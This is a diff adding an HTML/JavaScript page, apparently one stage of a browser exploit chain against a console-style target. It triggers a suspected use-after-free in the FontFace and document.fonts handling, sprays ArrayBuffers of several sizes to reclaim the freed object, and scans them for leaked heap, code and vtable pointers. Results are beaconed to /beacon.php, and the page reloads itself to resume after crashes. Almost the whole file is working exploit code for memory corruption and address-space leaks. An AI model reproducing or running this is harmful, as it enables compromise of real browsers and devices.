@@ -1,0 +1,292 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1087 - FL Leak Widening (all size classes)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}.ptr{color:#ff0;font-weight:bold}
+.vtable{color:#00ffff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1087 FL Leak Widening — Multi-Size Scan</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+var BOOT_SEC=0,BOOT_PREV={};
+try{
+  BOOT_SEC=parseInt(localStorage.getItem('p1087_sec')||'0');
+  var pr=localStorage.getItem('p1087_prev');
+  if(pr)BOOT_PREV=JSON.parse(pr);
+}catch(e){}
+try{localStorage.setItem('p1087_sec',''+(BOOT_SEC+1));
+localStorage.setItem('p1087_prev',JSON.stringify(BOOT_PREV));}catch(e){}
+
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1087-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+B('BOOT','sec='+BOOT_SEC+'|prev='+JSON.stringify(BOOT_PREV).slice(0,200));
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1087: FontFace Leak Widening Across ALL Spray Size Classes
+
+   Hypothesis: IsoHeap/TZone segregates by exact size, but different
+   object types in different size classes may leak code/vtable pointers
+   where the 192B CSSFontFace object only leaks heap pointers.
+
+   Method:
+   1. Same P1069v9 trigger: FontFace.prototype.then getter during
+      document.fonts.load() -> style.remove() + fonts.delete() + force layout.
+   2. Spray 10+ size classes simultaneously (64-2048 bytes).
+   3. After trigger, scan EVERY sprayed AB for non-zero qwords.
+   4. Categorize: heap ptr (0x1xxxxxxxxxx), code ptr (0x532... eboot),
+      vtable (offset 0, repeatable within boot).
+   5. Report all findings via beacon. Crash-resume per size class.
+
+   State machine: track completed sizes, resume on crash.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+/* CRITICAL FIX: only sizes that can reclaim the freed font object matter.
+   The CSSFontFace object is 192 bytes. IsoHeap/TZone means only 192-byte
+   allocations can reclaim it. Spraying other sizes is pointless — we need
+   to find OTHER UAF triggers that free objects in different size classes.
+   For now: test sizes NEAR 192B that might share a bucket (160, 192, 224,
+   256) plus a few larger sizes that might be coalesced/minibucketed. */
+var SIZES=[160,192,224,256,320,384];
+var SPRAY_PER_SIZE=80;
+var PROGRESS=[];
+try{var p=localStorage.getItem('p1087_prog');if(p)PROGRESS=JSON.parse(p);}catch(e){}
+if(!Array.isArray(PROGRESS))PROGRESS=[];
+
+var COMPLETED=[];
+try{var c=localStorage.getItem('p1087_done');if(c)COMPLETED=JSON.parse(c);}catch(e){}
+if(!Array.isArray(COMPLETED))COMPLETED=[];
+
+function saveProg(){
+  try{localStorage.setItem('p1087_prog',JSON.stringify(PROGRESS));
+  localStorage.setItem('p1087_done',JSON.stringify(COMPLETED));}catch(e){}
+}
+
+/* Find next untested size */
+var curSize=null,curIdx=-1;
+for(var i=0;i<SIZES.length;i++){
+  if(COMPLETED.indexOf(SIZES[i])<0){curSize=SIZES[i];curIdx=i;break;}
+}
+
+/* ════════ ALL DONE ════════ */
+if(curSize===null){
+  var summary='SIZES_DONE='+COMPLETED.join(',');
+  var foundPtr=false,foundCode=false,foundHeap=false;
+  for(var j=0;j<PROGRESS.length;j++){
+    var e=PROGRESS[j];
+    summary+=' | sz'+e.size+'='+e.foundCount+'nz';
+    if(e.foundCount>0)foundPtr=true;
+    if(e.codePtrCount>0)foundCode=true;
+    if(e.heapPtrCount>0)foundHeap=true;
+  }
+  B('ALL-DONE',summary);
+  log('=== ALL SIZES SCANNED ===','hit');
+  log(summary,'info');
+  if(foundCode){log('*** CODE POINTER FOUND! ***','vtable');B('VICTORY-CODEPTR','found');}
+  else if(foundPtr){log('Heap pointers found, no code pointers','warn');}
+  else {log('Zero leaks across all sizes','err');}
+  try{localStorage.removeItem('p1087_prog');
+  localStorage.removeItem('p1087_done');
+  localStorage.removeItem('p1087_sec');
+  localStorage.removeItem('p1087_prev');}catch(e){}
+}
+else {
+
+log('=== Scanning size '+curSize+' ('+(curIdx+1)+'/'+SIZES.length+') ===','info');
+var prevDone=COMPLETED.join(',');
+if(prevDone)log('Completed: '+prevDone,'info');
+
+/* ════════ FontFace trigger + spray for curSize ════════ */
+function runLeakScan(size){
+  B('LEAK-START','sz='+size);
+  var done=false;
+  var watchdog=setTimeout(function(){
+    if(done)return;done=true;
+    B('LEAK-WATCHDOG','sz='+size);
+    log('WATCHDOG: cb never fired (died in getter?)','err');
+    setTimeout(function(){location.reload(true);},400);
+  },8000);
+
+  function finish(result){
+    if(done)return;done=true;
+    clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}
+    onLeakResult(result,size);
+  }
+
+  try{
+    var firedHere=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(firedHere)return undefined;firedHere=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        /* NOTE: removed document.body.offsetHeight — it may touch freed font object synchronously */
+        /* Target-size spray + filler sizes to create pressure */
+        window.__spray=[];
+        var sprayCount=SPRAY_PER_SIZE;
+        if(size>=512)sprayCount=40;
+        for(var k=0;k<sprayCount;k++){
+          var ab=new ArrayBuffer(size);
+          window.__spray.push(ab);
+        }
+        /* Also spray a few of neighboring sizes for comparison */
+        var extras=[];
+        for(var ni=0;ni<SIZES.length;ni++){
+          if(SIZES[ni]!==size && SIZES[ni]<size+256 && SIZES[ni]>size-256){
+            extras.push(SIZES[ni]);
+          }
+        }
+        for(var ei=0;ei<extras.length&&ei<3;ei++){
+          for(var k2=0;k2<10;k2++){window.__spray.push(new ArrayBuffer(extras[ei]));}
+        }
+        /* Delayed check instead of synchronous force-layout */
+        setTimeout(function(){try{document.fonts.check('1em s0');}catch(e){}},0);
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+
+    setTimeout(function(){
+      B('LEAK-CB','sz='+size);
+      var foundList=[];
+      if(!window.__spray||window.__spray.length===0){
+        B('LEAK-NOSPRAY','sz='+size);
+        finish([]);return;
+      }
+      /* Scan ALL sprayed ABs for this size */
+      for(var si=0;si<window.__spray.length;si++){
+        var ab=window.__spray[si];
+        if(ab.byteLength!==size)continue;
+        var dv=new DataView(ab);
+        var nzCount=0,heapCount=0,codeCount=0,off0Val=null,off0IsPtr=false;
+        for(var off=0;off+7<size;off+=8){
+          var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
+          if(qw!==0n){
+            nzCount++;
+            var isHeap=(qw>0x1000000000n && qw<0x100000000000n);
+            var isEboot=((qw>>32n)===0x532n || (qw>>32n)===0x533n || (qw>>32n)===0x1000n);
+            var isCode=(qw>0x10000000000n && qw<0x100000000000n && !isHeap);
+            if(off===0){
+              off0Val='0x'+qw.toString(16);
+              off0IsPtr=isHeap||isEboot;
+            }
+            if(isHeap)heapCount++;
+            if(isEboot)codeCount++;
+          }
+        }
+        foundList.push({idx:si,nz:nzCount,heap:heapCount,code:codeCount,
+          off0:off0Val,off0ptr:off0IsPtr});
+      }
+      finish(foundList);
+    },100);
+  }catch(e){
+    B('LEAK-ERR','sz='+size+'|'+e.message);
+    log('LEAK error: '+e.message,'err');
+    finish(null);
+  }
+}
+
+function onLeakResult(foundList,size){
+  if(!foundList){
+    B('LEAK-FAIL','sz='+size);
+    log('Leak failed for sz='+size,'err');
+    setTimeout(function(){location.reload(true);},400);return;
+  }
+  if(foundList.length===0){
+    B('LEAK-NORECLAIM','sz='+size);
+    log('No reclaim for sz='+size,'warn');
+    COMPLETED.push(size);saveProg();
+    setTimeout(function(){location.reload(true);},400);return;
+  }
+
+  /* Find best candidate: most nz qwords */
+  var best=foundList[0];
+  for(var i=1;i<foundList.length;i++){
+    if(foundList[i].nz>best.nz)best=foundList[i];
+  }
+
+  /* Deep scan of best candidate */
+  var deepReport=[];
+  for(var si=0;si<window.__spray.length;si++){
+    var ab=window.__spray[si];
+    if(ab.byteLength!==size)continue;
+    var dv=new DataView(ab);
+    var reps=[];
+    for(var off=0;off+7<size;off+=8){
+      var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
+      if(qw!==0n){
+        var hex='0x'+qw.toString(16);
+        var isHeap=(qw>0x1000000000n && qw<0x100000000000n);
+        var isEboot=((qw>>32n)===0x532n || (qw>>32n)===0x533n || (qw>>32n)===0x1000n);
+        var cat=isEboot?'EBOOT':(isHeap?'HEAP':'OTHER');
+        reps.push('off'+off+'='+hex+'('+cat+')');
+      }
+    }
+    if(reps.length>0)deepReport.push('AB'+si+':['+reps.join(',')+']');
+  }
+
+  /* Summary */
+  var sum='sz='+size+'|n='+foundList.length+'|best_nz='+best.nz+'|best_heap='+best.heap+'|best_code='+best.code;
+  if(best.off0)sum+='|off0='+best.off0+(best.off0ptr?':PTR':':NONPTR');
+  B('LEAK-FOUND',sum);
+  B('LEAK-DEEP',deepReport.join(' ; ').slice(0,900));
+
+  log('Size '+size+': '+foundList.length+' reclaims, best has '+best.nz+' nz qwords','info');
+  if(best.off0)log('  off0='+best.off0+(best.off0ptr?' (PTR)':' (non-ptr)'),best.off0ptr?'ptr':'warn');
+  if(best.code>0)log('  *** '+best.code+' EBOOT-LIKE values! ***','vtable');
+
+  var entry={size:size,foundCount:foundList.length,heapPtrCount:best.heap,
+    codePtrCount:best.code,off0:best.off0,isPtr:best.off0ptr,deep:deepReport};
+  PROGRESS.push(entry);saveProg();
+  COMPLETED.push(size);saveProg();
+
+  /* Continue to next size */
+  log('Advancing to next size...','ok');
+  setTimeout(function(){location.reload(true);},600);
+}
+
+/* Mark this size as crashed if we die here */
+try{localStorage.setItem('p1087_testing',''+curSize);}catch(e){}
+
+/* RUN */
+runLeakScan(curSize);
+
+} /* end not-all-done */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1087-fl-size-widening';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
